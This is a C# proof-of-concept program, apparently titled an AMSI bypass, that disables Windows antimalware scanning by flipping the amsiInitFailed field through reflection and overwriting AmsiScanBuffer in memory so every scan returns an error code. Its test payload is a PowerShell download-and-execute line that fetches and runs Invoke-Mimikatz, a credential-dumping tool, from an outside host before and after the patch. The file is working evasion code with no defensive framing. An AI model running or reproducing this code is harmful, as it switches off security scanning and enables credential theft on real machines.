using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace PocBypassAmsi
{
    public class Program
    {
        static void Main(string[] args)
        {
            string psPath = FindPowerShellDll();
            if (psPath == null) {
                return;
            }

            Assembly psAsm = null;
            try
            {
                psAsm = Assembly.LoadFrom(psPath);
            } 
            catch (Exception ex) {
                Console.WriteLine("[!] Load ps dll failed: " + ex.Message);
                return;
            }

            if (psAsm == null) {
                Console.WriteLine("[!] Could not load PowerShell assembly");
                return;
            }

            object ps = null;
            try
            {
                Type psType = psAsm.GetType("System.Management.Automation.PowerShell", true);
                ps = psType
                    .GetMethod("Create",
                        BindingFlags.Public | BindingFlags.Static,
                        null,
                        Type.EmptyTypes,
                        null)
                    .Invoke(null, null);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Could not create Powershell instance: " + ex.Message);
                return;
            }

            const string script =
                "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/refs/heads/master/Invoke-Mimikatz.ps1')\n";

            //const string script = "Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'";

            Console.WriteLine("[+] Run before patch amsi");
            RunPsTest(ps, script);

            PatchAmsiInitFailed();
            PatchAmsiScanBuffer();

            Console.WriteLine("[+] Run after patch amsi");
            RunPsTest(ps, script);

            Console.WriteLine("[+] Success => Amsi cannot detect script");

            Console.WriteLine("[+] Enter to exit!!!");

            Console.Read();
        }

        static string FindPowerShellDll()
        {
            string[] dirs =
            {
                Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.System),
                    "WindowsPowerShell", "v1.0"),

                Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "Microsoft.NET", "assembly")
            };

            foreach (var dir in dirs)
            {
                if (!Directory.Exists(dir))
                    continue;

                var files = Directory.GetFiles(
                    dir,
                    "System.Management.Automation.dll",
                    SearchOption.AllDirectories);

                if (files.Length > 0)
                    return files[0];
            }

            return null;
        }

        private static void RunPsTest(object psObj, string script)
        {
            dynamic ps = psObj;

            ps.Commands.Clear();

            try
            {
                var results = ps
                    .AddScript(script)
                    .Invoke();

                foreach (var r in results)
                    Console.WriteLine("PS> " + r);

                foreach (var err in ps.Streams.Error)
                    Console.WriteLine("ERR> " + err);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] PS blocked by AMSI: " + ex.Message);
            }
        }

        public static void PatchAmsiInitFailed()
        {
            try
            {
                Type amsiUtils = null;

                foreach (Assembly asm in AppDomain.CurrentDomain.GetAssemblies())
                {
                    try
                    {
                        foreach (Type t in asm.GetTypes())
                        {
                            if (t.Name.Contains("siUtils") || t.Name.Contains("ntiMalware"))
                            {
                                amsiUtils = t;
                                Console.WriteLine("[*] Asm: " + asm.FullName);
                                break;
                            }
                        }
                    }
                    catch { }
                    if (amsiUtils != null) break;
                }

                if (amsiUtils == null)
                {
                    Console.WriteLine("[-] AmsiUtils not found.");
                    return;
                }

                Console.WriteLine("[*] Type: " + amsiUtils.FullName);

                FieldInfo initFailed = amsiUtils.GetField(
                    "amsiInitFailed",
                    BindingFlags.Static | BindingFlags.NonPublic
                );

                if (initFailed != null)
                {
                    Console.WriteLine("[*] Current value before: " + initFailed.GetValue(null));
                    initFailed.SetValue(null, true);
                    Console.WriteLine("[*] Current value after: " + initFailed.GetValue(null));  // ← Thêm dòng này
                    Console.WriteLine("[+] amsiInitFailed = true");
                    Console.WriteLine("[+] AMSI disabled.");
                }
                else
                {
                    Console.WriteLine("[-] amsiInitFailed not found. Fields:");
                    foreach (FieldInfo f in amsiUtils.GetFields(BindingFlags.Static | BindingFlags.NonPublic))
                    {
                        Console.WriteLine("  " + f.Name);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] " + ex.GetType().Name + ": " + ex.Message);
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void PatchAmsiScanBuffer()
        {
            try
            {
                IntPtr amsiLib = LoadLibrary("amsi.dll");
                if (amsiLib == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to load amsi.dll");
                    return;
                }

                IntPtr scanBuffer = GetProcAddress(amsiLib, "AmsiScanBuffer");
                if (scanBuffer == IntPtr.Zero)
                {
                    Console.WriteLine("[-] AmsiScanBuffer not found");
                    return;
                }

                Console.WriteLine("[*] AmsiScanBuffer address: 0x" + scanBuffer.ToInt64().ToString("X"));

                uint oldProtect;
                if (!VirtualProtect(scanBuffer, (UIntPtr)4096, 0x40, out oldProtect))
                {
                    Console.WriteLine("[-] VirtualProtect failed");
                    return;
                }

                byte[] patch = new byte[] {
                    0xB8, 0x57, 0x00, 0x07, 0x80, // mov eax, 0x80070057 (E_INVALIDARG)
                    0xC2, 0x14, 0x00              // ret 0x14
                };

                Marshal.Copy(patch, 0, scanBuffer, patch.Length);

                Console.WriteLine("[+] AmsiScanBuffer patched successfully!");
                Console.WriteLine("[+] AMSI will return E_INVALIDARG for all scans");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] " + ex.GetType().Name + ": " + ex.Message);
            }
        }
    }
}
